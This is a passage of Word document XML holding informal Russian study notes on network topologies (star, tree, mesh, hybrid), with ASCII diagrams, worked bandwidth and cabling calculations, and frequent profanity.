        <w:t xml:space="preserve"> (свитч или роутер). Весь трафик идёт через этот узел.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Схема</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">            [Компьютер 1]</w:t>
        <w:br/>
        <w:t xml:space="preserve">                  |</w:t>
        <w:br/>
        <w:t xml:space="preserve">    [Комп 2] ---- [СВИТЧ] ---- [Комп 4]</w:t>
        <w:br/>
        <w:t xml:space="preserve">                  |</w:t>
        <w:br/>
        <w:t xml:space="preserve">            [Компьютер 3]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Технологии</w:t>
      </w:r>
      <w:r>
        <w:t>: Ethernet (витая пара + свитч), Wi-Fi (точка доступа).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Высокая производительность** — каждое устройство работает на полной скорости (full-duplex)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Нет коллизий** — свитч разделяет трафик</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Отказ одного узла не убивает сеть** — сломался один комп → остальные работают</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Легко добавлять устройства** — воткнул кабель в свитч → готово</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Центральный узел — единая точка отказа** — если свитч сдох, вся сеть мертва</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Дороже** — нужен свитч (хаб не считается, он говно)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вердикт</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Самая популярная</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> топология. 99% современных LAN — это звезда.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример расчёта</w:t>
      </w:r>
      <w:r>
        <w:t>: Офис из 20 компов, каждый подключён к гигабитному свитчу (24 порта, 1 Гбит/с на порт). Все одновременно копируют файлы на сервер (нужно по 100 Мбит/с). Хватит ли пропускной способности?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Каждый комп → свитч: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>1 Гбит/с</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (достаточно для 100 Мбит/с).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Но свитч → сервер: только </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>1 Гбит/с</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>\[</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>20 \times 100 = 2000 \text{ Мбит/с} = 2 \text{ Гбит/с}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>\]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Не хватит!</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Канал свитч → сервер = </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>bottleneck</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Решение: подключить сервер </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>двумя портами</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (link aggregation, 2 Гбит/с) или использовать 10-гигабитный порт.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>2.4. Дерево (Tree) — иерархия звёзд</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как работает</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Несколько </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>звёзд</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, соединённых в </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>иерархию</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Это типа звезда, но </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>масштабируемая</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Схема</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">                  [Главный свитч]</w:t>
        <w:br/>
        <w:t xml:space="preserve">                   /           \</w:t>
        <w:br/>
        <w:t xml:space="preserve">            [Свитч 1]        [Свитч 2]</w:t>
        <w:br/>
        <w:t xml:space="preserve">             /    \            /    \</w:t>
        <w:br/>
        <w:t xml:space="preserve">        [Комп 1] [Комп 2]  [Комп 3] [Комп 4]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Технологии</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Ethernet с </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>многоуровневой</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> структурой (core → distribution → access).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Масштабируемость** — легко добавить новые свитчи</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Надёжность** — отказ одного свитча не убивает всю сеть (только его ветку)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Сложнее** — больше оборудования, больше кабелей</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Стоимость** — нужно больше свитчей</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вердикт</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Используется в </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>крупных</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> сетях (офисы на 500+ компов, университеты, дата-центры).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>: Компания на 3 этажах. На каждом этаже по свитчу (access layer), все этажные свитчи подключены к главному свитчу (core layer) в серверной.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>2.5. Полносвязная топология (Mesh) — каждый с каждым</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как работает</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Каждое устройство соединено </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>со всеми</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> остальными.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Схема</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (4 устройства):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">    [A] ---- [B]</w:t>
        <w:br/>
        <w:t xml:space="preserve">     | \    / |</w:t>
        <w:br/>
        <w:t xml:space="preserve">     |  \  /  |</w:t>
        <w:br/>
        <w:t xml:space="preserve">     |   \/   |</w:t>
        <w:br/>
        <w:t xml:space="preserve">     |   /\   |</w:t>
        <w:br/>
        <w:t xml:space="preserve">     |  /  \  |</w:t>
        <w:br/>
        <w:t xml:space="preserve">     | /    \ |</w:t>
        <w:br/>
        <w:t xml:space="preserve">    [D] ---- [C]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Формула</w:t>
      </w:r>
      <w:r>
        <w:t>: Количество связей = \( \frac{N \times (N-1)}{2} \), где N — количество устройств.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Максимальная надёжность** — если один канал сломался, данные пойдут другим путём</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Высокая производительность** — можно балансировать нагрузку между каналами</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Дорого как хер** — куча кабелей и портов</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Сложно масштабировать** — добавляешь 1 устройство → нужно N новых кабелей</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вердикт</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Используется </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>только</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> в критичных системах (магистральные роутеры интернет-провайдеров, дата-центры), где нужна </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>максимальная надёжность</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример расчёта</w:t>
      </w:r>
      <w:r>
        <w:t>: Сколько кабелей нужно для полносвязной сети из 10 роутеров?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>\[</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>\text{Кабелей} = \frac{10 \times 9}{2} = 45</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>\]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Каждый роутер должен иметь </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>9 портов</w:t>
      </w:r>
      <w:r>
        <w:t>. Если кабель стоит $50, а порт $100:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>\[</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>\text{Стоимость} = 45 \times 50 + 10 \times 9 \times 100 = 2250 + 9000 = 11250 \text{ долларов}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>\]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Охуенно дорого, но зато </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>надёжно</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>2.6. Гибридная топология — микс всего</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как работает</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Комбинация разных топологий. Например, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>звезда</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> на каждом этаже, а этажи соединены </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>кольцом</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> или </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>mesh</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Схема</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">         [Свитч 1] -------- [Свитч 2]</w:t>
        <w:br/>
        <w:t xml:space="preserve">         /  |  \               /  |  \</w:t>
        <w:br/>
        <w:t xml:space="preserve">    [A] [B] [C]           [D] [E] [F]</w:t>
        <w:br/>
        <w:t xml:space="preserve">          ↓                       ↓</w:t>
        <w:br/>
        <w:t xml:space="preserve">      (звезда)                (звезда)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Гибкость** — можешь подобрать оптимальное решение для каждой части сети</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Масштабируемость**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Сложность** — труднее проектировать и поддерживать</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вердикт</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Самая </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>реалистичная</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> топология для больших сетей.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>: Корпоративная сеть:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Офисы** — звезда (витая пара + свитчи)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Серверная** — mesh (свитчи соединены между собой для надёжности)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Удалённые филиалы** — WAN (VPN через интернет)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Итоговая таблица: сравнение топологий</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Топология   | Надёжность | Стоимость | Масштабируемость | Производительность | Статус      |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|-------------|------------|-----------|------------------|--------------------|-------------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Шина        | Низкая     | Низкая    | Плохая           | Низкая             | Вымерла     |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Кольцо      | Средняя    | Средняя   | Средняя          | Средняя            | Вымерла     |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Звезда      | Высокая    | Средняя   | Отличная         | Высокая            | Король 👑   |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Дерево      | Высокая    | Высокая   | Отличная         | Высокая            | Для больших |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Mesh        | Максимальная | Очень высокая | Плохая           | Максимальная       | Для критичных |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Гибридная   | Зависит    | Зависит   | Отличная         | Высокая            | Реальность  |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3. Физическая vs логическая топология</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Физическая топология</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>как</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> физически проложены кабели.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Логическая топология</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>как</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> передаются данные.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Физическая топология: звезда** — все кабели сходятся в центральный свитч.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Логическая топология: шина** — данные всё равно рассылаются всем устройствам (если используется хаб вместо свитча).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Но если используется </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>свитч</w:t>
      </w:r>
      <w:r>
        <w:t>, то:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Физическая: звезда**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Логическая: тоже звезда** (данные идут только нужному получателю)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Не путай физику и логику. Современные сети обычно </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>физически и логически — звезда</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4. Характеристики топологий</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4.1. Надёжность (Reliability)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вопрос</w:t>
      </w:r>
      <w:r>
        <w:t>: Что будет, если один узел/кабель сломается?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Шина, кольцо** → вся сеть мертва</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Звезда** → только один узел недоступен (но если центральный свитч сдох → всё мертво)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Mesh** → найдётся альтернативный путь</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: В офисе 50 компов, подключённых через </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>один свитч</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Свитч сгорел → все 50 компов без сети. Решение: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>резервный свитч</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (redundancy).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4.2. Масштабируемость (Scalability)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вопрос</w:t>
      </w:r>
      <w:r>
        <w:t>: Насколько легко добавить новые устройства?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Шина** → средне (нужно врезаться в кабель)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Кольцо** → хуёво (нужно остановить сеть)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Звезда** → легко (воткнул кабель в свитч)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Mesh** → хреново (нужно N новых кабелей)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вердикт</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Звезда — </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>самая масштабируемая</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4.3. Стоимость (Cost)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вопрос</w:t>
      </w:r>
      <w:r>
        <w:t>: Сколько стоит построить сеть?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Шина** → дёшево (один кабель)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Звезда** → средне (нужен свитч + кабели от каждого узла)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Mesh** → дорого как ебать (куча кабелей и портов)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример расчёта</w:t>
      </w:r>
      <w:r>
